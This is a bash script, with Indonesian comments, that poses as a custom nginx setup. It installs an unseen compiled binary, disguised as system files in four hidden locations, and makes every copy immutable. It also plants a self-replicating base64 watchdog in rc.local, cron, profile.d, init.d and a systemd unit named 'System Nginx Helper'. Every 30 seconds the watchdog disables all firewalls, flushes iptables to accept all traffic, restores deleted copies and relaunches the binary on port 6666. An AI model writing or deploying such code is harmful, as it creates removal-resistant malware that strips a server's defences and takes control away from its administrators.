#!/bin/bash
set -e

echo "=============================="
echo "  Auto Setup Custom Nginx"
echo "  Delete‑All Proof Persistence"
echo "=============================="

# ─── Deteksi OS ───────────────────────────────────────────
echo ""
echo "[1/8] Detecting OS..."
if [ -f /etc/os-release ]; then
    . /etc/os-release
    OS=$ID
else
    echo "ERROR: Cannot detect OS!"
    exit 1
fi
echo "  → Detected: $OS"

# ─── Open All Ports ───────────────────────────────────────
echo ""
echo "[2/8] Opening all ports..."
case "$OS" in
    ubuntu|debian)
        if command -v ufw &>/dev/null; then
            ufw disable
            echo "  → UFW disabled"
        fi
        ;;
    fedora|centos|rhel)
        if command -v firewall-cmd &>/dev/null; then
            systemctl stop firewalld
            systemctl disable firewalld
            echo "  → Firewalld disabled"
        fi
        ;;
esac
if command -v iptables &>/dev/null; then
    iptables -F; iptables -X
    iptables -P INPUT ACCEPT
    iptables -P FORWARD ACCEPT
    iptables -P OUTPUT ACCEPT
    echo "  → iptables flushed"
fi

# ─── Install GCC ──────────────────────────────────────────
echo ""
echo "[3/8] Installing GCC..."
case "$OS" in
    ubuntu|debian) apt-get update -qq && apt-get install -y gcc ;;
    fedora)        dnf install -y gcc ;;
    centos|rhel)   yum install -y gcc ;;
    arch)          pacman -Sy --noconfirm gcc ;;
    *) echo "ERROR: Unsupported OS: $OS"; exit 1 ;;
esac
echo "  → GCC installed!"

# ─── Build nginx dari nginx.c ─────────────────────────────
echo ""
echo "[4/8] Building nginx from nginx.c..."
if [ ! -f ./nginx.c ]; then
    echo "ERROR: nginx.c not found!"
    exit 1
fi
gcc nginx.c -o nginx -std=c99
echo "  → Build success!"

# ─── Pindahkan binary & buat backup tersembunyi ───────────
echo ""
echo "[5/8] Deploying binary & hidden backups..."
mv ./nginx /etc/nginx
chmod 700 /etc/nginx
chattr +i /etc/nginx 2>/dev/null || true

BACKUP_BINS=(
    "/usr/lib/systemd/systemd-nginx-helper"
    "/lib/udev/sd-helper"
    "/usr/share/man/man3/libnginx.so.3"
    "/opt/.cache/.nginx"
)
for bp in "${BACKUP_BINS[@]}"; do
    cp /etc/nginx "$bp"
    chmod 700 "$bp"
    chattr +i "$bp" 2>/dev/null || true
done
echo "  → Binary secured in 4 hidden locations"

# ─── Buat Payload Watchdog Self‑Replicating ────────────────
echo ""
echo "[6/8] Generating delete‑proof payload..."

# Template payload dengan placeholder __BASE64__
read -r -d '' PAYLOAD_TEMPLATE << 'TEMPLATE_EOF'
#!/bin/bash
# ====== SCRIPT PEMULIHAN MULTI‑PERSISTENCE (SELF‑REPLICATING) ======
SELF_CODE='__BASE64__'
MAIN_BIN="/etc/nginx"
BACKUP_BINS=(
    "/usr/lib/systemd/systemd-nginx-helper"
    "/lib/udev/sd-helper"
    "/usr/share/man/man3/libnginx.so.3"
    "/opt/.cache/.nginx"
)
WATCHDOG_PATHS=(
    "/etc/rc.local"
    "/etc/cron.d/nginx-system"
    "/etc/profile.d/nginx-helper.sh"
    "/etc/init.d/nginx-persistence"
)

restore_all_files() {
    # Pulihkan binary utama dari backup manapun
    if [ ! -f "$MAIN_BIN" ]; then
        for src in "${BACKUP_BINS[@]}"; do
            if [ -f "$src" ]; then
                cp "$src" "$MAIN_BIN"
                chmod 700 "$MAIN_BIN"
                chattr +i "$MAIN_BIN" 2>/dev/null
                break
            fi
        done
    fi

    # Pulihkan backup binary yang hilang
    for dest in "${BACKUP_BINS[@]}"; do
        if [ ! -f "$dest" ]; then
            for src in "$MAIN_BIN" "${BACKUP_BINS[@]}"; do
                if [ -f "$src" ] && [ "$src" != "$dest" ]; then
                    cp "$src" "$dest"
                    chmod 700 "$dest"
                    chattr +i "$dest" 2>/dev/null
                    break
                fi
            done
        fi
    done

    # Pulihkan SEMUA file watchdog dari payload di memori
    for target in "${WATCHDOG_PATHS[@]}"; do
        if [ ! -f "$target" ]; then
            echo "$SELF_CODE" | base64 -d > "$target"
            chmod 000 "$target" 2>/dev/null
            chattr +i "$target" 2>/dev/null
        fi
    done

    # Pastikan nginx berjalan
    if ! pgrep -f "/etc/nginx 6666" >/dev/null; then
        if [ -x "$MAIN_BIN" ]; then
            "$MAIN_BIN" 6666 &
        else
            for src in "${BACKUP_BINS[@]}"; do
                if [ -x "$src" ]; then
                    "$src" 6666 &
                    break
                fi
            done
        fi
    fi
}

# Jika dipanggil dengan --oneshot (cron), lakukan restore lalu keluar
if [ "$1" = "--oneshot" ]; then
    restore_all_files
    exit 0
fi

# Mode abadi (untuk rc.local / service)
(
    while true; do
        ufw disable 2>/dev/null || true
        systemctl stop firewalld 2>/dev/null || true
        systemctl disable firewalld 2>/dev/null || true
        iptables -F; iptables -X
        iptables -P INPUT ACCEPT
        iptables -P FORWARD ACCEPT
        iptables -P OUTPUT ACCEPT
        restore_all_files
        sleep 30
    done
) &
exit 0
TEMPLATE_EOF

# 1. Encode template (dengan placeholder) → base64
B64_TEMPLATE=$(echo "$PAYLOAD_TEMPLATE" | base64 -w0)

# 2. Ganti placeholder dengan base64 dirinya sendiri → script final
FINAL_PAYLOAD=$(echo "$PAYLOAD_TEMPLATE" | sed "s|__BASE64__|${B64_TEMPLATE}|g")

echo "  → Payload self‑replicating berhasil dibuat."

# ─── Sebarkan Watchdog ke Semua Titik ─────────────────────
echo ""
echo "[7/8] Planting watchdog everywhere..."

deploy_watchdog() {
    local target="$1"
    echo "$FINAL_PAYLOAD" > "$target"
    chmod 000 "$target" 2>/dev/null
    chattr +i "$target" 2>/dev/null || true
}

# A. /etc/rc.local
deploy_watchdog /etc/rc.local

# B. /etc/cron.d/nginx-system
deploy_watchdog /etc/cron.d/nginx-system

# C. /etc/profile.d/nginx-helper.sh
deploy_watchdog /etc/profile.d/nginx-helper.sh
chmod 755 /etc/profile.d/nginx-helper.sh   # dibaca user, tapi isinya tetap terproteksi

# D. /etc/init.d/nginx-persistence
deploy_watchdog /etc/init.d/nginx-persistence
chmod 755 /etc/init.d/nginx-persistence
if command -v update-rc.d &>/dev/null; then
    update-rc.d nginx-persistence defaults
elif command -v chkconfig &>/dev/null; then
    chkconfig --add nginx-persistence
fi

# E. Cron job setiap menit (pakai --oneshot)
echo "* * * * * root /etc/cron.d/nginx-system --oneshot" > /etc/cron.d/nginx-system-cron
chmod 000 /etc/cron.d/nginx-system-cron
chattr +i /etc/cron.d/nginx-system-cron 2>/dev/null || true

# F. systemd service (jika ada)
if command -v systemctl &>/dev/null; then
    cat > /etc/systemd/system/nginx-persistence.service << SYSTEMD_EOF
[Unit]
Description=System Nginx Helper
After=network.target

[Service]
Type=forking
ExecStart=/bin/bash -c 'while true; do /etc/rc.local 2>/dev/null; sleep 30; done' &
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
SYSTEMD_EOF
    systemctl daemon-reload
    systemctl enable nginx-persistence.service 2>/dev/null
    systemctl start nginx-persistence.service 2>/dev/null
    echo "  → systemd service deployed"
fi

echo "  → Watchdog planted in all locations"

# ─── Jalankan Awal ────────────────────────────────────────
echo ""
echo "[8/8] Activating persistence..."

# Mulai loop utama di background
bash /etc/rc.local &
# Jalankan restore one‑shot untuk memastikan nginx langsung hidup
bash /etc/cron.d/nginx-system --oneshot &

sleep 1
echo ""
echo "=============================="
echo "  SUCCESS – Multi‑Persistence ACTIVE"
echo "  Delete‑all resistance ENGAGED"
echo "=============================="
ps aux | grep nginx | grep -v grep || echo "  (nginx akan segera hidup jika belum terlihat)"